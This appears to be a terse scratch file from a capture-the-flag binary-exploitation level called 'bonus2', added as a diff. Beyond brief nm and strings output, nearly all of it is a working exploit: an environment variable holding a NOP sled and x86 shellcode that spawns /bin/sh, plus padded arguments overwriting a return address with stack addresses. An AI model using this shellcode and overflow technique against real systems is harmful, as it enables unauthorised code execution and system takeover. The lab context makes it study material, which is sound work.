@@ -1,0 +1,23 @@
+
+#> nm bonus2
+08049988 B language
+08048529 T main
+08048484 T greetuser
+
+#> strings bonus2
+strncpy
+memcmp
+strcat
+getenv
+LANG
+
+LANG=`python -c 'print "nl_" + "\x90"*1000 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+
+
+python -c 'print "A"*40' > arg1
+python -c 'print "A"*23 + "\x70\xd6\xff\xff" + "A"*5' > arg2
+
+"\x70\xd6\xff\xff"
+0xbffffb25
+"\x70\xf7\xff\xbf"
+
